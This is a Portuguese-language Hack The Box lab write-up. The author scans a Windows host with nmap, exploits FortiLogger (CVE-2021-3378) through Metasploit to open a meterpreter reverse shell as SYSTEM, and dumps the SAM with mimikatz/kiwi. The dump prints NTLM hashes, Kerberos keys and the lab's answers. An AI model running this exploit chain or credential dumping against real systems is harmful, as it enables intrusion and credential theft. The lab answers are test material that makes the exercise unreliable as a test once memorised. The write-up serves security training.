## Tags
#Hackthebox 

## Alvo
- O alvo é uma máquina rodando windows e certos serviços , nisso eu tinha de achar qual deles era vulnerável e conseguir executar um exploit nele para obter um meterpreter.

## Objetivo
-  Encontre a exploração existente em MSF e use-a para obter um shell no alvo. Qual é o nome de usuário do usuário com o qual você obteve um shell? -> NT AUTHORITY\SYSTEM
-  Recupere o hash de senha NTLM para o usuário "htb-student". Submeta o hash como resposta. -> cf3a5525ee9414229e66279623ed5c58

## Ferramentas e scripts utilizados
- nmap
- msfconsole

## Resultados obtidos
```
sudo nmap -sS 10.129.151.159    
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-02 09:05 -0400
Nmap scan report for 10.129.151.159
Host is up (0.29s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5000/tcp open  upnp
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 32.80 seconds
                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.151.159
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-02 09:10 -0400
Nmap scan report for 10.129.151.159
Host is up (1.1s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-09-02T13:11:17+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=WIN-51BJ97BCIPV
| Not valid before: 2026-09-01T13:04:28
|_Not valid after:  2027-03-03T13:04:28
| rdp-ntlm-info: 
|   Target_Name: WIN-51BJ97BCIPV
|   NetBIOS_Domain_Name: WIN-51BJ97BCIPV
|   NetBIOS_Computer_Name: WIN-51BJ97BCIPV
|   DNS_Domain_Name: WIN-51BJ97BCIPV
|   DNS_Computer_Name: WIN-51BJ97BCIPV
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-02T13:11:08+00:00
5000/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: FortiLogger | Log and Report System
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-02T13:11:07
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.20 seconds
```
Aqui utilizei o nmap para enumera o host alvo e vi certas portas abertas sendo algumas do SMB , outras de rdp e a 5000 que era servidor web rodando em IIS 10.0 , olhei se esse IIS era vulnerável mas não era , o httpd 2.0 também não e nisso acessei esse ip nessa porta 5000 e vi uma aplicação chamada Fortilogger , nisso olhei no msfconsole algum exploit para ela e apareceu um , resolvi testar e funcionou.

--- 
```
msf > search fortilogger

Matching Modules
================

   #  Full Name                                              Disclosure Date  Rank    Check  Name
   -  ---------                                              ---------------  ----    -----  ----
   0  exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    FortiLogger Arbitrary File Upload Exploit


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/fortilogger_arbitrary_fileupload                                                                                                             

msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/http/fortilogger_arbitrary_fileupload) > info

       Name: FortiLogger Arbitrary File Upload Exploit
     Module: exploit/windows/http/fortilogger_arbitrary_fileupload
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2021-02-26

Provided by:
  Berkan Er <b3rsec@protonmail.com>

Module side effects:
 artifacts-on-disk
 ioc-in-logs

Module stability:
 crash-safe

Module reliability:
 unreliable-session

Available targets:
      Id  Name
      --  ----
  =>  0   FortiLogger < 5.2.0

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported prox
                                        ies: http, sapni, socks4, socks5, socks5h
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                        sics/using-metasploit.html
  RPORT      5000             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path to the FortiLogger
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module exploits an unauthenticated arbitrary file upload
  via insecure POST request. It has been tested on versions < 5.2.0 in
  Windows 10 Enterprise.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-3378
  https://erberkan.github.io/2021/cve-2021-3378/


View the full module info with the info -d command.

msf exploit(windows/http/fortilogger_arbitrary_fileupload) > set RHOST 10.129.151.159
RHOST => 10.129.151.159
msf exploit(windows/http/fortilogger_arbitrary_fileupload) > show options

Module options (exploit/windows/http/fortilogger_arbitrary_fileupload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported pro
                                         xies: http, sapni, socks4, socks5, socks5h
   RHOSTS     10.129.151.159   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                         asics/using-metasploit.html
   RPORT      5000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the FortiLogger
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   FortiLogger < 5.2.0



View the full module info with the info, or info -d command.

msf exploit(windows/http/fortilogger_arbitrary_fileupload) > set LHOST 10.10.17.37
LHOST => 10.10.17.37
msf exploit(windows/http/fortilogger_arbitrary_fileupload) > exploit
[*] Started reverse TCP handler on 10.10.17.37:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. FortiLogger version 4.4.2.2
[+] Generate Payload
[+] Payload has been uploaded
[*] Executing payload...
[*] Sending stage (203451 bytes) to 10.129.151.159
[*] Meterpreter session 1 opened (10.10.17.37:4444 -> 10.129.151.159:49687) at 2026-09-02 09:30:20 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Aqui fiz a busca pelo exploit , vi as infos dele , setei as configs e executei o exploit , com isso ganhei o meterpreter e dei getuid para ver qual user eu estava com meterpreter e era o System , logo respondi a primeira pergunta e posso responder a segunda.

---
Tentei executar hashdump mas estava dando erro , nisso eu usei o lsa_dump_sam que busca as credenciais no banco local SAM mas tive de carregar a extensão kiwi para usar esse comando.
```
meterpreter > lsa_dump_sam
[-] The "lsa_dump_sam" command requires the "kiwi" extension to be loaded (run: `load kiwi`)
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : WIN-51BJ97BCIPV
SysKey : c897d22c1c56490b453e326f86b2eef8
Local SID : S-1-5-21-2348711446-3829538955-3974936019

SAMKey : e52d743c76043bf814df6e48f1efcb23

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : d0e507b237b40a3a1f62ba1935465406

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-51BJ97BCIPVAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 545c81812fc803221b22e47ab8789c104f38b151c677fbc4006894db6d174f1b
      aes128_hmac       (4096) : 5d59bcd0e74c5ed8951b9f2b658eef43
      des_cbc_md5       (4096) : 76436b1c190d892a
    OldCredentials
      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
      des_cbc_md5       (4096) : 9876615285c2766e
    OlderCredentials
      aes256_hmac       (4096) : 09c55a10e6b955caac4abbf7ff37b81488a2ede67a150c00c775fa00d94768ab
      aes128_hmac       (4096) : b49643128581ac08a1fae957f7787f72
      des_cbc_md5       (4096) : d32592d63b75ec1f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-51BJ97BCIPVAdministrator
    Credentials
      des_cbc_md5       : 76436b1c190d892a
    OldCredentials
      des_cbc_md5       : 9876615285c2766e


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 92793b2cbb0532b4fbea6c62ee1c72c8

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c34300ce936f766e6b0aca4191b93dfb576bbe9efa2d2888b3f275c74d7d9c55
      aes128_hmac       (4096) : 6b6a769c33971f0da23314d5cef8413e
      des_cbc_md5       (4096) : 61299e7a768fa2d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 61299e7a768fa2d5


RID  : 000003ea (1002)
User : htb-student
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f88979e2a6999b5cbc7a9308e7b4cd82

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-51BJ97BCIPVhtb-student
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1ed226feb91bfd21489a12a58c6cb38b99ab70feb30d971c8987fb44bcb15213
      aes128_hmac       (4096) : 629343148027bcf0d48cf49b066a9960
      des_cbc_md5       (4096) : 379791d616ef6d0e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-51BJ97BCIPVhtb-student
    Credentials
      des_cbc_md5       : 379791d616ef6d0e
```
Com isso visualizei nos resultados o valor do hash do htb-student e respondi a segunda pergunta.

## Considerações
LIções aprendidas
- As vezes um comando meterpreter mesmo como system pode não funcionar.
- Tenha em mente muitas variedades de formas para conseguir um mesmo resultado para não ficar preso em só uma maneira.
- Nmap não entregou muita coisa então vá fuçar os serviços manualmente.







